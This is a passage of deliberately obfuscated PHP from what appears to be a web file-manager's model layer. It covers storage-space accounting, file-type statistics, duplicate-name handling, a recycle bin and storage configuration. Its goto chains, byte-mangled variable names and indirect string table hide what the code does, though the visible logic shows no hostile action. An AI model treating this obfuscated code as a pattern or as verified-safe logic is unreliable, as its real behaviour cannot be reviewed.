array($CÊÕ”Åá‚¤[531] => 1, $CÊÕ”Åá‚¤[538] => array($CÊÕ”Åá‚¤[496], $bÎ¬»Ê…[$CÊÕ”Åá‚¤[472]] . $aŸä¹—İ‘© . $CÊÕ”Åá‚¤[497])); $dé‹Èªß¡ß = $CÊÕ”Åá‚¤[2392]; $c±–ß´É—‡ = $this->field($dé‹Èªß¡ß)->where($b‘İ…®æÖÔ)->select(); goto fŸåôÇ©Ö§; Fã—êİÀ’ƒ: $c±–ß´É—‡[] = $bÎ¬»Ê…; $c±–ß´É—‡ = array_to_keyvalue($c±–ß´É—‡, $CÊÕ”Åá‚¤[381]); foreach ($c±–ß´É—‡ as $eÑÛ…çÎÓÍ => $aÊ•÷“™ïœ) { $c±–ß´É—‡[$eÑÛ…çÎÓÍ][$CÊÕ”Åá‚¤[2393]] = $c±–ß´É—‡[$eÑÛ…çÎÓÍ][$CÊÕ”Åá‚¤[77]]; $c±–ß´É—‡[$eÑÛ…çÎÓÍ][$CÊÕ”Åá‚¤[77]] = 0; } goto dˆ‚”ØÆÕî; dˆ‚”ØÆÕî: foreach ($fî•ÀíèÙ‚ as $aÊ•÷“™ïœ) { $Eˆ‰Ë°‰­ = $aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[474]] . $CÊÕ”Åá‚¤[33]; if (!isset($c±–ß´É—‡[$Eˆ‰Ë°‰­])) { continue; } if ($aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[409]] == $c±–ß´É—‡[$Eˆ‰Ë°‰­][$CÊÕ”Åá‚¤[409]]) { $c±–ß´É—‡[$Eˆ‰Ë°‰­][$CÊÕ”Åá‚¤[77]] += $aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[77]]; } } foreach ($c±–ß´É—‡ as $aÊ•÷“™ïœ) { $cì§ÅõÜ×õ = $this->parentLevelArray($aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[472]]); foreach ($cì§ÅõÜ×õ as $Eˆ‰Ë°‰­) { $Eˆ‰Ë°‰­ = $Eˆ‰Ë°‰­ . $CÊÕ”Åá‚¤[33]; if (!isset($c±–ß´É—‡[$Eˆ‰Ë°‰­])) { continue; } if ($aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[409]] == $c±–ß´É—‡[$Eˆ‰Ë°‰­][$CÊÕ”Åá‚¤[409]]) { $c±–ß´É—‡[$Eˆ‰Ë°‰­][$CÊÕ”Åá‚¤[77]] += $aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[77]]; } } } $f¬óÛ¦ƒ‚¤ = array(); goto b¤Ù‹Ô¸»İ; fŸåôÇ©Ö§: $b‘İ…®æÖÔ[$CÊÕ”Åá‚¤[382]] = 0; $fî•ÀíèÙ‚ = $this->field($dé‹Èªß¡ß)->where($b‘İ…®æÖÔ)->select(); if (!$fî•ÀíèÙ‚) { return; } goto Fã—êİÀ’ƒ; b˜±ƒ÷•æç: $CÊÕ”Åá‚¤ =& $_SERVER[‡’¶øåüç˜]; $this->sourceCacheClear($aŸä¹—İ‘©); $bÎ¬»Ê… = $this->sourceInfo($aŸä¹—İ‘©); goto f¢ŠÂÃÄ¾É; b¤Ù‹Ô¸»İ: foreach ($c±–ß´É—‡ as $aÊ•÷“™ïœ) { if ($aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[77]] == $aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[2393]]) { continue; } $f¬óÛ¦ƒ‚¤[] = array($CÊÕ”Åá‚¤[381], $aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[381]], $CÊÕ”Åá‚¤[77], $aÊ•÷“™ïœ[$CÊÕ”Åá‚¤[77]]); } $this->saveAll($f¬óÛ¦ƒ‚¤); goto BËˆ³’‘Ï; BËˆ³’‘Ï: } public function userSpaceReset($cƒ²…È…‰È = false) { $E ¹ğƒïÜº =& $_SERVER[‡’¶øåüç˜]; $b“óˆ¶îõÖ = $this->where(array($E ¹ğƒïÜº[383] => self::TYPE_USER, $E ¹ğƒïÜº[469] => $cƒ²…È…‰È, $E ¹ğƒïÜº[382] => 0))->sum($E ¹ğƒïÜº[77]); Model($E ¹ğƒïÜº[487])->userEdit($cƒ²…È…‰È, array($E ¹ğƒïÜº[2098] => $b“óˆ¶îõÖ)); } public function targetSpaceUpdate($EÂ®çÆÏ½‡, $B‚²ë‘Ï‡Æ) { $Cî­šğìÉÃ =& $_SERVER[‡’¶øåüç˜]; if (!$B‚²ë‘Ï‡Æ) { return; } if (!in_array($EÂ®çÆÏ½‡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Fëå—Ó ‚ = $this->targetSpaceSize($EÂ®çÆÏ½‡, $B‚²ë‘Ï‡Æ); if ($EÂ®çÆÏ½‡ == self::TYPE_USER) { Model($Cî­šğìÉÃ[487])->userEdit($B‚²ë‘Ï‡Æ, array($Cî­šğìÉÃ[2098] => $Fëå—Ó ‚)); } else { if ($EÂ®çÆÏ½‡ == self::TYPE_GROUP) { Model($Cî­šğìÉÃ[471])->groupEdit($B‚²ë‘Ï‡Æ, array($Cî­šğìÉÃ[2098] => $Fëå—Ó ‚)); } } } public function targetSpaceSize($E¼†¨—Ùô¹, $FÓÛÔÑ‡¯ê) { goto F“÷˜¼µ¬ù; fÙ™‚ğŒ: return $e™¯£¥‘ì; goto FºÅãÜ˜Ø; fªŠ ØÜì¯: $E—¡õ†ö‡ = array_to_keyvalue($E—¡õ†ö‡, $cœŠÜÓŸÔƒ[33], $cœŠÜÓŸÔƒ[381]); $E—¡õ†ö‡ = array_unique(array_filter($E—¡õ†ö‡)); if ($E—¡õ†ö‡) { $a‰ÔƒÚ¾ = array($cœŠÜÓŸÔƒ[395] => array($cœŠÜÓŸÔƒ[396], $E—¡õ†ö‡)); $e™¯£¥‘ì += floatval($this->where($a‰ÔƒÚ¾)->sum($cœŠÜÓŸÔƒ[77])); } goto fÙ™‚ğŒ; F“÷˜¼µ¬ù: $cœŠÜÓŸÔƒ =& $_SERVER[‡’¶øåüç˜]; $FíŞæ‹¨‡ = $this->sourceRoot($E¼†¨—Ùô¹, $FÓÛÔÑ‡¯ê, !0); if (!$FíŞæ‹¨‡) { return 0; } goto fíÎÚ¾±Ê; fíÎÚ¾±Ê: $e™¯£¥‘ì = floatval($FíŞæ‹¨‡[$cœŠÜÓŸÔƒ[77]]); $a‰ÔƒÚ¾ = array($cœŠÜÓŸÔƒ[538] => array($cœŠÜÓŸÔƒ[496], $cœŠÜÓŸÔƒ[483] . $FíŞæ‹¨‡[$cœŠÜÓŸÔƒ[381]] . $cœŠÜÓŸÔƒ[497])); $E—¡õ†ö‡ = Model($cœŠÜÓŸÔƒ[407])->field($cœŠÜÓŸÔƒ[395])->where($a‰ÔƒÚ¾)->select(); goto fªŠ ØÜì¯; FºÅãÜ˜Ø: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($c¨ğÜ‘†¼‘) { return $this->fileTypeProfile($c¨ğÜ‘†¼‘, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Câè‡˜…¦) { return $this->fileTypeProfile($Câè‡˜…¦, SourceModel::TYPE_GROUP); } private function fileTypeProfile($díùèçœ, $a»«‰…éƒ) { goto e¶÷Èëª„™; aÁÊáÆÆãù: if ($aÃéòğÄô¸) { return $aÃéòğÄô¸; } $FÉëšŒÜ­» = array($Cå‘±´Ììõ[531] => 0); if ($díùèçœ != !1) { $FÉëšŒÜ­»[$Cå‘±´Ììõ[469]] = $díùèçœ; $FÉëšŒÜ­»[$Cå‘±´Ììõ[383]] = $a»«‰…éƒ; } goto aÇ’´Ó‹á; e¶÷Èëª„™: $Cå‘±´Ììõ =& $_SERVER[‡’¶øåüç˜]; $c‰†ºÔô‹ = $Cå‘±´Ììõ[2394] . $díùèçœ . $Cå‘±´Ììõ[70] . $a»«‰…éƒ; $aÃéòğÄô¸ = Cache::get($c‰†ºÔô‹); goto aÁÊáÆÆãù; aÇ’´Ó‹á: $fêóÍ•îò¡ = array(); $fêóÍ•îò¡[$Cå‘±´Ììõ[2395]] = array($Cå‘±´Ììõ[2396] => LNG($Cå‘±´Ììõ[2395]), $Cå‘±´Ììõ[2397] => $this->where($FÉëšŒÜ­»)->count(), $Cå‘±´Ììõ[533] => $this->where($FÉëšŒÜ­»)->sum($Cå‘±´Ììõ[77])); $A‰Ø÷‘ŸÌÌ = KodIO::fileTypeList(); goto Aá¦™Àá¥ã; Aá¦™Àá¥ã: foreach ($A‰Ø÷‘ŸÌÌ as $e£çƒù´ˆÉ => $B÷· ¸ÉÈ·) { $FÉëšŒÜ­»[$Cå‘±´Ììõ[384]] = $this->fileTypeWhere($e£çƒù´ˆÉ); $fêóÍ•îò¡[$e£çƒù´ˆÉ] = array($Cå‘±´Ììõ[2396] => $B÷· ¸ÉÈ·[$Cå‘±´Ììõ[28]], $Cå‘±´Ììõ[2397] => $this->where($FÉëšŒÜ­»)->count(), $Cå‘±´Ììõ[533] => $this->where($FÉëšŒÜ­»)->sum($Cå‘±´Ììõ[77])); } Cache::set($c‰†ºÔô‹, $fêóÍ•îò¡, 1200); return $fêóÍ•îò¡; goto CÎÛ†õù¹; CÎÛ†õù¹: } public function fileNameExist($DŠæ°“öà, $açŸØÇÓÌ) { $F•ÜÊ‰ËÀ =& $_SERVER[‡’¶øåüç˜]; $CÔÁÒÏÁé² = $this->childList($DŠæ°“öà); foreach ($CÔÁÒÏÁé² as $Fİ©„¦ƒ‚) { if ($Fİ©„¦ƒ‚[$F•ÜÊ‰ËÀ[28]] == $açŸØÇÓÌ) { return $Fİ©„¦ƒ‚[$F•ÜÊ‰ËÀ[381]]; } if (strtolower($Fİ©„¦ƒ‚[$F•ÜÊ‰ËÀ[28]]) == strtolower($açŸØÇÓÌ)) { return $Fİ©„¦ƒ‚[$F•ÜÊ‰ËÀ[381]]; } } return !1; } public function childList($CóĞ‰î”Ò•) { goto d–•‘†³‘Ç; eõï‹ê‰Ï­: $Bº‚”Öëø = array($dÔøºÖàÙ[474] => intval($CóĞ‰î”Ò•), $dÔøºÖàÙ[409] => 0); $fÆÈÙğÀÛâ = $this->where($Bº‚”Öëø)->select(); $fÆÈÙğÀÛâ = $fÆÈÙğÀÛâ ? $fÆÈÙğÀÛâ : array(); goto eØóÉ¡é·×; d–•‘†³‘Ç: $dÔøºÖàÙ =& $_SERVER[‡’¶øåüç˜]; $b¢¢öÉ¯¾ = $dÔøºÖàÙ[2376] . $CóĞ‰î”Ò•; if (isset(self::$cacheChildList[$b¢¢öÉ¯¾])) { return self::$cacheChildList[$b¢¢öÉ¯¾]; } goto eõï‹ê‰Ï­; eØóÉ¡é·×: self::$cacheChildList[$b¢¢öÉ¯¾] = $fÆÈÙğÀÛâ; foreach ($fÆÈÙğÀÛâ as $DÕö´ƒ¥Ùˆ) { $b¢¢öÉ¯¾ = $dÔøºÖàÙ[422] . $DÕö´ƒ¥Ùˆ[$dÔøºÖàÙ[381]]; self::$cacheSourceInfo[$b¢¢öÉ¯¾] = $DÕö´ƒ¥Ùˆ; } return $fÆÈÙğÀÛâ; goto C½‘»Ö·ƒ´; C½‘»Ö·ƒ´: } public function fileNameAuto($dŠÏ‹…¤œò, $eõÜà©‹”’, $A‘ƒœ‘‹Ô = REPEAT_RENAME, $FèŸì‚Ö = false) { $fÑ·˜ÉÅ¥° =& $_SERVER[‡’¶øåüç˜]; $Fîè£Œå¦ = $this->childList($dŠÏ‹…¤œò); $bç’ŞšåïÃ = array_to_keyvalue($Fîè£Œå¦, $fÑ·˜ÉÅ¥°[33], $fÑ·˜ÉÅ¥°[28]); return $this->fileNameAutoGet($bç’ŞšåïÃ, $eõÜà©‹”’, $A‘ƒœ‘‹Ô, $FèŸì‚Ö); } public function fileNameAutoGet($bª”ãÃ ãä, $BœóÁÊ‚“, $eŸğ²Êš´, $B–Àò­ Á“) { $fìÓœª„Ùƒ =& $_SERVER[‡’¶øåüç˜]; if ($eŸğ²Êš´ == REPEAT_REPLACE || !$bª”ãÃ ãä || !in_array_not_case($BœóÁÊ‚“, $bª”ãÃ ãä) || $B–Àò­ Á“ && $eŸğ²Êš´ != REPEAT_RENAME_FOLDER) { return $BœóÁÊ‚“; } if ($eŸğ²Êš´ == REPEAT_SKIP) { return !1; } $EòÒù­À¯¤ = $fìÓœª„Ùƒ[91] . get_path_ext($BœóÁÊ‚“); $EòÒù­À¯¤ = $EòÒù­À¯¤ == $fìÓœª„Ùƒ[91] || $B–Àò­ Á“ ? $fìÓœª„Ùƒ[33] : $EòÒù­À¯¤; for ($e“”‡ìâ—ˆ = 1; $e“”‡ìâ—ˆ <= count($bª”ãÃ ãä) + 1; $e“”‡ìâ—ˆ++) { $FóŠõ˜‘ = substr($BœóÁÊ‚“, 0, strlen($BœóÁÊ‚“) - strlen($EòÒù­À¯¤)); $aİ°…ˆóã = $FóŠõ˜‘ . "\x28{$e“”‡ìâ—ˆ}\51{$EòÒù­À¯¤}"; if (!in_array_not_case($aİ°…ˆóã, $bª”ãÃ ãä)) { return $aİ°…ˆóã; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\143\145\x5f\162\145\x63\x79\x63\154\145"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\x54\x69\155\145", "\x74\151\155\145", "\151\x6e\x73\145\x72\164", "\x66\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($CæÉ˜ƒªÜ = false) { $F ‹‚ÑÚÎÌ =& $_SERVER[‡’¶øåüç˜]; $CæÉ˜ƒªÜ = $CæÉ˜ƒªÜ ? $CæÉ˜ƒªÜ : USER_ID; $céÉ›­ßÍ  = $this->where(array($F ‹‚ÑÚÎÌ[1434] => $CæÉ˜ƒªÜ))->select(); return array_to_keyvalue($céÉ›­ßÍ , $F ‹‚ÑÚÎÌ[33], $F ‹‚ÑÚÎÌ[381]); } public function moveToRecycle($D˜²çÛ±ª§) { goto d†ƒÖÜ¼òÉ; Aß¾®…¶í: $this->recycleMove($D˜²çÛ±ª§, 1); if ($bõ‹Ùİ¶ï¸[$d‡ğ‘Ô¨Ø[382]] == $d‡ğ‘Ô¨Ø[83]) { $B—¤¸Ù¿¤¤ = array($d‡ğ‘Ô¨Ø[538] => array($d‡ğ‘Ô¨Ø[496], $bõ‹Ùİ¶ï¸[$d‡ğ‘Ô¨Ø[472]] . $D˜²çÛ±ª§ . $d‡ğ‘Ô¨Ø[497])); $DÖ¾Å¼œØô->where($B—¤¸Ù¿¤¤)->setField($d‡ğ‘Ô¨Ø[409], 1); } goto Cƒ×šŠ±‹; d†ƒÖÜ¼òÉ: $d‡ğ‘Ô¨Ø =& $_SERVER[‡’¶øåüç˜]; $DÖ¾Å¼œØô = Model($d‡ğ‘Ô¨Ø[1124]); $bõ‹Ùİ¶ï¸ = $DÖ¾Å¼œØô->sourceInfo($D˜²çÛ±ª§); goto bÜóˆœïî; bÜóˆœïî: if (!$bõ‹Ùİ¶ï¸ || $bõ‹Ùİ¶ï¸[$d‡ğ‘Ô¨Ø[409]] == $d‡ğ‘Ô¨Ø[83]) { return; } $f¦•¼á¯°Á = array($d‡ğ‘Ô¨Ø[395] => $D˜²çÛ±ª§, $d‡ğ‘Ô¨Ø[1434] => USER_ID, $d‡ğ‘Ô¨Ø[534] => $bõ‹Ùİ¶ï¸[$d‡ğ‘Ô¨Ø[383]], $d‡ğ‘Ô¨Ø[535] => $bõ‹Ùİ¶ï¸[$d‡ğ‘Ô¨Ø[469]], $d‡ğ‘Ô¨Ø[538] => $bõ‹Ùİ¶ï¸[$d‡ğ‘Ô¨Ø[472]]); $this->add($f¦•¼á¯°Á); goto Aß¾®…¶í; Cƒ×šŠ±‹: } public function clear() { $this->remove(!1); } public function remove($EÕÃ»¶² = false) { goto f¡’ƒ‰ó§˜; bÚĞâšÀ‡Ñ: $EÕÃ»¶² = $EÕÃ»¶² === !1 ? !1 : $EÕÃ»¶²; $eœƒªÕÖÑ = array(); foreach ($aŒ…»¤Ğê¢ as $B¬‘ –Ä) { if ($EÕÃ»¶² != !1 && !in_array($B¬‘ –Ä, $EÕÃ»¶²)) { continue; } $d·çŞ¹²Ö† = $AÓÑàÆùÔ‡->sourceInfo($B¬‘ –Ä); $AÓÑàÆùÔ‡->remove($B¬‘ –Ä, !1); $e…½ËÕêÈ¼ = $d·çŞ¹²Ö†[$D³º«Ôæë[383]] . $D³º«Ôæë[70] . $d·çŞ¹²Ö†[$D³º«Ôæë[469]]; $eœƒªÕÖÑ[$e…½ËÕêÈ¼] = array($D³º«Ôæë[534] => $d·çŞ¹²Ö†[$D³º«Ôæë[383]], $D³º«Ôæë[469] => $d·çŞ¹²Ö†[$D³º«Ôæë[469]]); $this->where(array($D³º«Ôæë[381] => $B¬‘ –Ä))->delete(); } goto aòšğÆšô; aòšğÆšô: foreach ($eœƒªÕÖÑ as $D¡­šÆÉŸ) { $AÓÑàÆùÔ‡->targetSpaceUpdate($D¡­šÆÉŸ[$D³º«Ôæë[383]], $D¡­šÆÉŸ[$D³º«Ôæë[469]]); } goto BÍ„å†§ÊÃ; f¡’ƒ‰ó§˜: $D³º«Ôæë =& $_SERVER[‡’¶øåüç˜]; $AÓÑàÆùÔ‡ = Model($D³º«Ôæë[1124]); $aŒ…»¤Ğê¢ = $this->listData(); goto bÚĞâšÀ‡Ñ; BÍ„å†§ÊÃ: } public function restore($D’Ê¼‡çİ = false) { goto BÃ‹ê¯¬ Á; Då¦—®’õ: $D’Ê¼‡çİ = $D’Ê¼‡çİ == !1 ? !1 : $D’Ê¼‡çİ; if (!$aöéÜÔõê÷) { return !0; } $fï½‹ËÈ«© = array(); goto cç¨¹¸êÍ±; cç¨¹¸êÍ±: foreach ($aöéÜÔõê÷ as $D˜¶ôéïãÕ) { goto F®«‚²œ«İ; F¡­îîÓ™Ê: if ($eê´»ª©¥•[$F²ˆÕ•™°±[382]] == $F²ˆÕ•™°±[83]) { $bŒˆÙ±¥”Ï = array($F²ˆÕ•™°±[538] => array($F²ˆÕ•™°±[496], $eê´»ª©¥•[$F²ˆÕ•™°±[472]] . $D˜¶ôéïãÕ . $F²ˆÕ•™°±[497])); $b—á‡»ß->where($bŒˆÙ±¥”Ï)->setField($F²ˆÕ•™°±[409], 0); $this->restoreFolderChildren($D˜¶ôéïãÕ, $aöéÜÔõê÷); } $this->where(array($F²ˆÕ•™°±[381] => $D˜¶ôéïãÕ))->delete(); $b—á‡»ß->folderSizeReset($eê´»ª©¥•[$F²ˆÕ•™°±[474]]); goto dâ“’; F®«‚²œ«İ: if ($D’Ê¼‡çİ != !1 && !in_array($D˜¶ôéïãÕ, $D’Ê¼‡çİ)) { continue; } $eê´»ª©¥• = $b—á‡»ß->sourceInfo($D˜¶ôéïãÕ); $b°¯ˆ“©ò£ = $b—á‡»ß->sourceInfo($eê´»ª©¥•[$F²ˆÕ•™°±[474]]); goto A¦Ê«âŠ±Ê; dâ“’: $fï½‹ËÈ«©[] = $eê´»ª©¥•[$F²ˆÕ•™°±[474]]; if ($eê´»ª©¥•[$F²ˆÕ•™°±[382]] == $F²ˆÕ•™°±[83]) { $fï½‹ËÈ«©[] = $D˜¶ôéïãÕ; } $b—á‡»ß->lockMoveEnd($D˜¶ôéïãÕ); goto fâÎñÂÔá¡; A¦Ê«âŠ±Ê: if ($b°¯ˆ“©ò£[$F²ˆÕ•™°±[409]] == $F²ˆÕ•™°±[83]) { continue; } $b—á‡»ß->lockMoveStart($D˜¶ôéïãÕ); $this->recycleMove($D˜¶ôéïãÕ, 0); goto F¡­îîÓ™Ê; fâÎñÂÔá¡: } $b—á‡»ß->updateModifyTime($fï½‹ËÈ«©); goto CêñŞ¦Ã …; BÃ‹ê¯¬ Á: $F²ˆÕ•™°± =& $_SERVER[‡’¶øåüç˜]; $b—á‡»ß = Model($F²ˆÕ•™°±[1124]); $aöéÜÔõê÷ = $this->listData(); goto Då¦—®’õ; CêñŞ¦Ã …: } private function restoreFolderChildren($A„ä˜ğ…Ø, $f‡ÑÜù¹’ö) { goto EŠİñ®®¿; EŠİñ®®¿: $DÏò„Ù†Ö® =& $_SERVER[‡’¶øåüç˜]; $C¡õ–÷¬ùÏ = Model($DÏò„Ù†Ö®[1124]); $AâŸ²´Ü¯ = array($DÏò„Ù†Ö®[381] => array($DÏò„Ù†Ö®[7], array())); goto B«¿Ó¢á˜Ô; B¼º„øÏì: $AâŸ²´Ü¯[$DÏò„Ù†Ö®[381]][1] = array_unique($AâŸ²´Ü¯[$DÏò„Ù†Ö®[381]][1]); $AâŸ²´Ü¯[$DÏò„Ù†Ö®[917]] = $DÏò„Ù†Ö®[2197]; $C¡õ–÷¬ùÏ->where($AâŸ²´Ü¯)->setField($DÏò„Ù†Ö®[409], 1); goto DÓ¢ß¦ˆˆâ; B«¿Ó¢á˜Ô: foreach ($f‡ÑÜù¹’ö as $eÁÌ™ÀÅ©ñ) { if ($eÁÌ™ÀÅ©ñ == $A„ä˜ğ…Ø) { continue; } if (!$C¡õ–÷¬ùÏ->isParentOf($A„ä˜ğ…Ø, $eÁÌ™ÀÅ©ñ)) { continue; } $b„õåÌ¨ğê = $C¡õ–÷¬ùÏ->sourceInfo($eÁÌ™ÀÅ©ñ); if ($b„õåÌ¨ğê[$DÏò„Ù†Ö®[382]] == $DÏò„Ù†Ö®[83]) { $AâŸ²´Ü¯[] = array($DÏò„Ù†Ö®[538] => array($DÏò„Ù†Ö®[496], $b„õåÌ¨ğê[$DÏò„Ù†Ö®[472]] . $eÁÌ™ÀÅ©ñ . $DÏò„Ù†Ö®[497])); } else { $AâŸ²´Ü¯[$DÏò„Ù†Ö®[381]][1][] = $eÁÌ™ÀÅ©ñ; } } if (!$AâŸ²´Ü¯[$DÏò„Ù†Ö®[381]][1]) { unset($AâŸ²´Ü¯[$DÏò„Ù†Ö®[381]]); } if (!$AâŸ²´Ü¯) { return; } goto B¼º„øÏì; DÓ¢ß¦ˆˆâ: } private function recycleMove($aœ˜‚½âŒŸ, $F–¹ŞİÍ‘ = 1) { $CáŸŞÓñÅ¹ =& $_SERVER[‡’¶øåüç˜]; $D÷êËØñª = Model($CáŸŞÓñÅ¹[1124]); $EºŠ»ñÃ¥ù = Model($CáŸŞÓñÅ¹[2398]); $FÓ¨Ü•Ø¨¡ = array($CáŸŞÓñÅ¹[381] => $aœ˜‚½âŒŸ); if ($F–¹ŞİÍ‘) { $D÷êËØñª->where($FÓ¨Ü•Ø¨¡)->setField($CáŸŞÓñÅ¹[409], 1); $EºŠ»ñÃ¥ù->eventRecycle($aœ˜‚½âŒŸ, $CáŸŞÓñÅ¹[2399]); } else { $Bì¾¤‡ÌéŠ = $D÷êËØñª->where($FÓ¨Ü•Ø¨¡)->find(); $b‰ÊÈÑœ» = $Bì¾¤‡ÌéŠ[$CáŸŞÓñÅ¹[382]] == $CáŸŞÓñÅ¹[83]; $f‘¥µğ—ãÚ = $D÷êËØñª->fileNameAuto($Bì¾¤‡ÌéŠ[$CáŸŞÓñÅ¹[474]], $Bì¾¤‡ÌéŠ[$CáŸŞÓñÅ¹[28]], REPEAT_RENAME_FOLDER, $b‰ÊÈÑœ»); if ($f‘¥µğ—ãÚ != $Bì¾¤‡ÌéŠ[$CáŸŞÓñÅ¹[28]]) { $D÷êËØñª->rename($aœ˜‚½âŒŸ, $f‘¥µğ—ãÚ); } $D÷êËØñª->where($FÓ¨Ü•Ø¨¡)->setField($CáŸŞÓñÅ¹[409], 0); $EºŠ»ñÃ¥ù->eventRecycle($aœ˜‚½âŒŸ, $CáŸŞÓñÅ¹[2400]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\x73\x74\x6f\162\x61\x67\145\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\163\x69\172\145\x4d\141\x78", "\x73\171\x73\164\x65\155", "\x64\145\x66\141\x75\x6c\x74", "\144\162\x69\x76\145\x72", "\x63\157\x6e\146\x69\147"); public function listData($bˆ„Â”â¨› = false, $CØ“„‚¨© = "\x6d\157\x64\151\146\171\124\151\x6d\145", $B‘›ÚÇÆˆË = false) { goto cĞÂùÙ™¤Ñ; Dƒ¯š”®¤¥: return $e²í² ë“ê; goto d‹ªª×Ùİ; cĞÂùÙ™¤Ñ: $BİÜ•åŒ¹ =& $_SERVER[‡’¶øåüç˜]; $e²í² ë“ê = parent::listData($bˆ„Â”â¨›, $CØ“„‚¨©, $B‘›ÚÇÆˆË); if ($bˆ„Â”â¨›) { return $e²í² ë“ê; } goto E†àèÀå¤; E†àèÀå¤: foreach ($e²í² ë“ê as $eâéÊí¸È => $f¬´ƒÒ±¥) { unset($e²í² ë“ê[$eâéÊí¸È][$BİÜ•åŒ¹[6]]); $e²í² ë“ê[$eâéÊí¸È][$BİÜ•åŒ¹[2098]] = 0; } $A…£¬ÁÖ = array_to_keyvalue($e²í² ë“ê, $BİÜ•åŒ¹[33], $BİÜ•åŒ¹[371]); $this->_listAppendSize($e²í² ë“ê, $A…£¬ÁÖ); goto Dƒ¯š”®¤¥; d‹ªª×Ùİ: } public function _listAppendSize(&$f—Ï‰…îˆ, $C£éàòâ£) { $Dİíğ…Ş•ø =& $_SERVER[‡’¶øåüç˜]; if (!$C£éàòâ£) { return; } $C³‡“Ë» = $Dİíğ…Ş•ø[2401] . implode($Dİíğ…Ş•ø[47], $C£éàòâ£) . $Dİíğ…Ş•ø[2402]; $C±áƒ›Ğ¹ö = Model($Dİíğ…Ş•ø[724])->query($C³‡“Ë»); $C±áƒ›Ğ¹ö = array_to_keyvalue($C±áƒ›Ğ¹ö, $Dİíğ…Ş•ø[371], $Dİíğ…Ş•ø[77]); foreach ($f—Ï‰…îˆ as $E¶™ŒİëÏ® => $A²›­å±´ï) { $f—Ï‰…îˆ[$E¶™ŒİëÏ®][$Dİíğ…Ş•ø[2098]] = isset($C±áƒ›Ğ¹ö[$A²›­å±´ï[$Dİíğ…Ş•ø[371]]]) ? $C±áƒ›Ğ¹ö[$A²›­å±´ï[$Dİíğ…Ş•ø[371]]] : 0; } } public function getConfig($a¹’ƒ¯ìÚĞ) { $aÚº¡øå‡– = parent::listData($a¹’ƒ¯ìÚĞ); return json_decode($aÚº¡øå‡–[$_SERVER[‡’¶øåüç˜][6]], !0); } public function update($E™—¡À›å©, $eøÅ¶ÛĞ­) { goto FÍ·´œĞ÷; FÍ·´œĞ÷: $DğØãç±©¼ =& $_SERVER[‡’¶øåüç˜]; $e­È…ö¡ï = $eøÅ¶ÛĞ­[$DğØãç±©¼[28]]; $D”ÂÙÚ›Œß = array_to_keyvalue(parent::listData(), $DğØãç±©¼[28]); goto dÑ×˜àï¯«; f•Ñ¼éé¦¦: $eÊË•™®™ = parent::update($E™—¡À›å©, $eøÅ¶ÛĞ­); if ($eÊË•™®™ && $eøÅ¶ÛĞ­[$DğØãç±©¼[34]]) { foreach ($D”ÂÙÚ›Œß as $D©­¾Ëê×) { if ($D©­¾Ëê×[$DğØãç±©¼[34]] && $D©­¾Ëê×[$DğØãç±©¼[371]] != $E™—¡À›å©) { parent::update($D©­¾Ëê×[$DğØãç±©¼[371]], array($DğØãç±©¼[34] => 0)); } } } return $eÊË•™®™; goto EŞˆ«£¦Ø·; dÑ×˜àï¯«: if (isset($D”ÂÙÚ›Œß[$e­È…ö¡ï]) && $D”ÂÙÚ›Œß[$e­È…ö¡ï][$DğØãç±©¼[371]] != $E™—¡À›å©) { return !1; } if (isset($eøÅ¶ÛĞ­[$DğØãç±©¼[2403]]) && $eøÅ¶ÛĞ­[$DğØãç±©¼[2403]] == $DğØãç±©¼[83]) { $this->checkConfig($eøÅ¶ÛĞ­); } unset($eøÅ¶ÛĞ­[$DğØãç±©¼[2403]]); goto f•Ñ¼éé¦¦; EŞˆ«£¦Ø·: } public function add($Dºéùø¥ìğ) { goto D—ŠÍóÌŠ÷; D—ŠÍóÌŠ÷: $A¯çÕ‡õÓ =& $_SERVER[‡’¶øåüç˜]; $dá‰Ìª©•ä = array_to_keyvalue(parent::listData(), $A¯çÕ‡õÓ[28]); if (isset($dá‰Ìª©•ä[$Dºéùø¥ìğ[$A¯çÕ‡õÓ[28]]])) { return !1; } goto E÷Ìª…Æ¡†; E÷Ìª…Æ¡†: $this->checkConfig($Dºéùø¥ìğ); $aÌíÚÖ´³Õ = parent::insert($Dºéùø¥ìğ); if ($aÌíÚÖ´³Õ && $Dºéùø¥ìğ[$A¯çÕ‡õÓ[34]]) { foreach ($dá‰Ìª©•ä as $f¬Á¯“ÀÉš) { if ($f¬Á¯“ÀÉš[$A¯çÕ‡õÓ[34]]) { parent::update($f¬Á¯“ÀÉš[$A¯çÕ‡õÓ[371]], array($A¯çÕ‡õÓ[34] => 0)); } } } goto bˆÛÙ¹å¥ ; bˆÛÙ¹å¥ : return $aÌíÚÖ´³Õ; goto b“³‘³Í¾ˆ; b“³‘³Í¾ˆ: } public function checkConfig(&$C×Ñ‹ùÔóÎ) { goto cÅëø…©­ò; EÕÙŠŠ‚: foreach ($fæÓòÈÍáØ as $F»ØÖœò => $cÛ…Ï°Î²„) { $fæÓòÈÍáØ[$F»ØÖœò] = trim($cÛ…Ï°Î²„); } $fæÓòÈÍáØ[$Fõ·ğ˜¹Œ‹[2404]] = rand_string(6); $DÎÎ¸÷É = $GLOBALS[$Fõ·ğ˜¹Œ‹[6]][$Fõ·ğ˜¹Œ‹[84]][$Fõ·ğ˜¹Œ‹[759]]; goto CÆ´‡ÕŠ–; BÜíÁî°Í: $C×Ñ‹ùÔóÎ[$Fõ·ğ˜¹Œ‹[6]] = json_encode($fæÓòÈÍáØ); $C×Ñ‹ùÔóÎ[$Fõ·ğ˜¹Œ‹[90]] = $dÈ‡­‹ø”¦; return !0; goto bœ²èà¸¿¿; CÆ´‡ÕŠ–: 